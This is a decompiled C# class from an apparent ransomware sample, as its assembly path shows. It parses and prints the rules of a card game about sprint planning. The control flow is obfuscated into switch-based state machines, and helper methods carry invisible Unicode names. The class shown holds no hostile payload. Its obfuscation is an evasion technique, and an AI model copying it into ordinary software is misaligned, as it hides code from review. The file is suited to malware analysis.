// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Rules
// Assembly: ASMNA, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 756C4858-C1DF-4594-BBF4-94321F458D9F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-b15de477cfbeebb8bbdc45f252c7c6bc6d2897ab737240c78a82a618f6e85508.exe

using SimpleJSON;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Rules
  {
    public int SprintCount { get; private set; }

    public int MaxImpact { get; private set; }

    public Card[] Cards { get; private set; }

    public int InitialResources { get; private set; }

    public int NormalPlanningCount { get; private set; }

    public int NormalPlanningCost { get; private set; }

    public int OverPlanningCost { get; private set; }

    public int SprintsWonWithoutPlanning { get; private set; }

    public float[] RiskChances { get; private set; }

    public bool EconomicsAffectsAll { get; private set; }

    public int StayOnSprintMinDiff { get; private set; }

    public bool OnlyOneWinner { get; private set; }

    private Rules()
    {
label_1:
      int num1 = 762680898;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 78471807)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1543409611 ^ 176467800;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public static Rules Deserialize(JSONNode json)
    {
      int asInt = json["max-impact"].AsInt;
label_1:
      int num1 = -1589935740;
      Rules rules;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -773489504)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            rules = new Rules()
            {
              SprintCount = json["sprints"].AsInt,
              MaxImpact = asInt,
              Cards = Rules.ParseDeck(json["deck"], asInt),
              InitialResources = json["initial-resources"].AsInt,
              NormalPlanningCount = json["normal-planning-count"].AsInt,
              NormalPlanningCost = json["normal-planning-cost"].AsInt,
              OverPlanningCost = json["over-planning-cost"].AsInt,
              SprintsWonWithoutPlanning = json["sprints-won-without-planning"].AsInt,
              RiskChances = Rules.ParseRiskChances(json["risk-chances"]),
              EconomicsAffectsAll = json["economics-affects-all"].AsBool,
              StayOnSprintMinDiff = json["stay-on-sprint-min-diff"].AsInt,
              OnlyOneWinner = json["only-one-winner"].AsBool
            };
            num1 = (int) num2 * 880703871 ^ -89494260;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return rules;
    }

    private static float[] ParseRiskChances(JSONNode json)
    {
      float[] numArray = new float[json.Count];
label_1:
      int num1 = 316781083;
      float[] riskChances;
      int aIndex;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 843222616)) % 8U)
        {
          case 0:
            int num3;
            num1 = num3 = aIndex < numArray.Length ? 573786871 : (num3 = 1241771722);
            continue;
          case 2:
            riskChances = numArray;
            num1 = (int) num2 * 1661911010 ^ -1263151147;
            continue;
          case 3:
            aIndex = 0;
            num1 = (int) num2 * -252418850 ^ 1958780767;
            continue;
          case 4:
            ++aIndex;
            num1 = (int) num2 * -1593834367 ^ 253546620;
            continue;
          case 5:
            num1 = (int) num2 * 724307323 ^ -1779941497;
            continue;
          case 6:
            goto label_1;
          case 7:
            numArray[aIndex] = json[aIndex].AsFloat;
            num1 = 1614578764;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return riskChances;
    }

    private static Card[] ParseDeck(JSONNode json, int maxImpact)
    {
label_1:
      int num1 = 323464125;
      int num2;
      JSONNode jsonNode;
      int aIndex1;
      bool flag1;
      bool flag2;
      int aIndex2;
      bool flag3;
      int count;
      List<Card> cardList;
      Card[] array;
      bool flag4;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 113281101)) % 24U)
        {
          case 0:
            jsonNode = json[aIndex2];
            num1 = 220254952;
            continue;
          case 1:
            cardList.Add(new Card()
            {
              Impact = flag2 ? -(maxImpact - aIndex1) : maxImpact * 2 - aIndex1,
              Type = aIndex2
            });
            num1 = 419958144;
            continue;
          case 2:
            num1 = 1262612730;
            continue;
          case 3:
            num1 = 1838214321;
            continue;
          case 5:
            ++num2;
            num1 = (int) num3 * -606350514 ^ -401979160;
            continue;
          case 6:
            flag3 = aIndex1 < maxImpact * 2;
            num1 = 617376813;
            continue;
          case 7:
            int num4 = flag1 ? 1661917961 : (num4 = 1292062226);
            num1 = num4 ^ (int) num3 * 825557450;
            continue;
          case 8:
            count = json.Count;
            num1 = (int) num3 * -37645254 ^ 159598474;
            continue;
          case 9:
            ++aIndex1;
            num1 = (int) num3 * -1946514115 ^ 1408546214;
            continue;
          case 10:
            flag4 = aIndex2 < count;
            num1 = 1279624078;
            continue;
          case 11:
            int num5 = !flag4 ? 744927867 : (num5 = 359280777);
            num1 = num5 ^ (int) num3 * 1621221868;
            continue;
          case 12:
            num1 = (int) num3 * 255661967 ^ -743427979;
            continue;
          case 13:
            aIndex1 = 0;
            num1 = (int) num3 * 1306819972 ^ 2004344188;
            continue;
          case 14:
            goto label_1;
          case 15:
            cardList = new List<Card>();
            num1 = (int) num3 * -1065320909 ^ 1460573686;
            continue;
          case 16:
            int num6 = flag3 ? -1653922330 : (num6 = -957257708);
            num1 = num6 ^ (int) num3 * 1453087;
            continue;
          case 17:
            ++aIndex2;
            num1 = (int) num3 * -314458878 ^ -637955755;
            continue;
          case 18:
            array = cardList.ToArray();
            num1 = (int) num3 * 1343824 ^ 580417457;
            continue;
          case 19:
            flag1 = num2 < jsonNode[aIndex1].AsInt;
            num1 = 1263807642;
            continue;
          case 20:
            num2 = 0;
            num1 = (int) num3 * 425662058 ^ 1338936262;
            continue;
          case 21:
            num1 = (int) num3 * -266940520 ^ -1569985781;
            continue;
          case 22:
            aIndex2 = 0;
            num1 = (int) num3 * -49087894 ^ -1685226869;
            continue;
          case 23:
            flag2 = aIndex1 < maxImpact;
            num1 = (int) num3 * -1138269832 ^ 215313668;
            continue;
          default:
            goto label_25;
        }
      }
label_25:
      return array;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1039927184;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 849293272)) % 3U)
        {
          case 1:
            str = Rules.\u200B⁭‪⁫‌‎​⁬⁭‪⁫⁫‌‌‮⁮​‭⁯‭⁬⁯‫‭‫⁫⁮⁫⁬⁪‬‫‍‮⁯⁫‍‬⁪‭‮("sprints: {0},\nmax-impact:{1},\ndeck: \n{2},\n\ninitial-resources: {3},\n\nnormal-planning-count: {4},\nnormal-planning-cost: {5},\nover-planning-cost: {6},\nsprints-won-without-planning: {7},\n\nrisk-chances: {8},\n\neconomics-affects-all: {9},\nstay-on-sprint-min-diff: {10},\nonly-one-winner: {11}", new object[12]
            {
              (object) this.SprintCount,
              (object) this.MaxImpact,
              (object) this.CardsToString(),
              (object) this.InitialResources,
              (object) this.NormalPlanningCount,
              (object) this.NormalPlanningCost,
              (object) this.OverPlanningCost,
              (object) this.SprintsWonWithoutPlanning,
              (object) this.RiskChancesToString(),
              (object) this.EconomicsAffectsAll,
              (object) this.StayOnSprintMinDiff,
              (object) this.OnlyOneWinner
            });
            num1 = (int) num2 * 514222688 ^ 1638767982;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    private string CardsToString()
    {
label_1:
      int num1 = 476883041;
      Card[] cards;
      int index;
      string str1;
      Card card1;
      string str2;
      int num2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 404380009)) % 15U)
        {
          case 0:
            str2 = Rules.\u200F‏‬‍‭⁯‫‍‪‭‪⁪⁪⁬‮‏⁬⁮⁯⁬‬‎‪‬‬⁯⁭⁭‏‭​‪⁯‫​‏‍‏​‌‮(str1, "\n]");
            num1 = (int) num3 * -284083160 ^ 1802577092;
            continue;
          case 1:
            num1 = (int) num3 * 1280885314 ^ 1448215101;
            continue;
          case 2:
            string str3 = str1;
            Card card2 = card1;
            string str4 = card2 != null ? Rules.\u202E‬‭⁯‬​⁬‮‏‬‍‎‏‏⁮⁫‌​⁫⁫⁮‭⁪‬‎⁭‭‎‏⁭‭⁪‍‎‫⁫⁭‮‪‏‮((object) card2) : (string) null;
            str1 = Rules.\u206D⁮⁯‭⁭‭⁬‫⁪‭⁮‮⁫‬‬‭‪⁯⁯‬⁮⁮⁬⁫⁭⁪⁫​⁬⁮⁭⁪‬⁬‭⁬⁮⁮‫‪‮(str3, str4, " ");
            num1 = 756599537;
            continue;
          case 3:
            num1 = (int) num3 * -891238306 ^ 606820336;
            continue;
          case 4:
            num2 = 0;
            num1 = (int) num3 * -798756160 ^ 99389461;
            continue;
          case 5:
            int num4;
            num1 = num4 = index < cards.Length ? 667287329 : (num4 = 917124981);
            continue;
          case 7:
            str1 = Rules.\u200F‏‬‍‭⁯‫‍‪‭‪⁪⁪⁬‮‏⁬⁮⁯⁬‬‎‪‬‬⁯⁭⁭‏‭​‪⁯‫​‏‍‏​‌‮(str1, "\n\t");
            num1 = (int) num3 * -1861014893 ^ -1525031071;
            continue;
          case 8:
            goto label_1;
          case 9:
            ++index;
            num1 = (int) num3 * -461873152 ^ -1576133048;
            continue;
          case 10:
            cards = this.Cards;
            index = 0;
            num1 = (int) num3 * -1833385840 ^ -244425395;
            continue;
          case 11:
            str1 = "[\n\t";
            num1 = (int) num3 * -1394653465 ^ -359204442;
            continue;
          case 12:
            num2 = card1.Type;
            num1 = (int) num3 * -502503539 ^ 1150218618;
            continue;
          case 13:
            num1 = (int) num3 * 693571379 ^ -1376843491;
            continue;
          case 14:
            card1 = cards[index];
            int num5;
            num1 = num5 = num2 != card1.Type ? 1348448359 : (num5 = 144421391);
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    private string RiskChancesToString()
    {
      string str1 = Rules.\u200F‏‬‍‭⁯‫‍‪‭‪⁪⁪⁬‮‏⁬⁮⁯⁬‬‎‪‬‬⁯⁭⁭‏‭​‪⁯‫​‏‍‏​‌‮("[ ", this.RiskChances[0].ToString((IFormatProvider) Rules.\u206C⁪‫‍⁭‫⁫‮‫⁮⁫‪‭​‍‏‌‎‎⁫⁮​⁮‫‪⁯⁮‌‍⁮⁭‭‎‮‏⁪‎‬‪‍‮()));
      int index = 1;
label_4:
      bool flag = index < this.RiskChances.Length;
      int num1 = -1607705614;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2033825087)) % 7U)
        {
          case 1:
            str2 = Rules.\u200F‏‬‍‭⁯‫‍‪‭‪⁪⁪⁬‮‏⁬⁮⁯⁬‬‎‪‬‬⁯⁭⁭‏‭​‪⁯‫​‏‍‏​‌‮(str1, " ]");
            num1 = (int) num2 * -1065962553 ^ 1468282502;
            continue;
          case 2:
            int num3 = flag ? -1442331531 : (num3 = -203755710);
            num1 = num3 ^ (int) num2 * -1372568286;
            continue;
          case 3:
            goto label_4;
          case 4:
            ++index;
            num1 = (int) num2 * -331680960 ^ 324673190;
            continue;
          case 5:
            str1 = Rules.\u206D⁮⁯‭⁭‭⁬‫⁪‭⁮‮⁫‬‬‭‪⁯⁯‬⁮⁮⁬⁫⁭⁪⁫​⁬⁮⁭⁪‬⁬‭⁬⁮⁮‫‪‮(str1, ", ", this.RiskChances[index].ToString((IFormatProvider) Rules.\u206C⁪‫‍⁭‫⁫‮‫⁮⁫‪‭​‍‏‌‎‎⁫⁮​⁮‫‪⁯⁮‌‍⁮⁭‭‎‮‏⁪‎‬‪‍‮()));
            num1 = -345376942;
            continue;
          case 6:
            num1 = -1890663501;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return str2;
    }

    static string \u200B⁭‪⁫‌‎​⁬⁭‪⁫⁫‌‌‮⁮​‭⁯‭⁬⁯‫‭‫⁫⁮⁫⁬⁪‬‫‍‮⁯⁫‍‬⁪‭‮([In] string obj0, [In] object[] obj1) => string.Format(obj0, obj1);

    static string \u200F‏‬‍‭⁯‫‍‪‭‪⁪⁪⁬‮‏⁬⁮⁯⁬‬‎‪‬‬⁯⁭⁭‏‭​‪⁯‫​‏‍‏​‌‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static string \u202E‬‭⁯‬​⁬‮‏‬‍‎‏‏⁮⁫‌​⁫⁫⁮‭⁪‬‎⁭‭‎‏⁭‭⁪‍‎‫⁫⁭‮‪‏‮([In] object obj0) => obj0.ToString();

    static string \u206D⁮⁯‭⁭‭⁬‫⁪‭⁮‮⁫‬‬‭‪⁯⁯‬⁮⁮⁬⁫⁭⁪⁫​⁬⁮⁭⁪‬⁬‭⁬⁮⁮‫‪‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static CultureInfo \u206C⁪‫‍⁭‫⁫‮‫⁮⁫‪‭​‍‏‌‎‎⁫⁮​⁮‫‪⁯⁮‌‍⁮⁭‭‎‮‏⁪‎‬‪‍‮() => CultureInfo.InvariantCulture;
  }
}
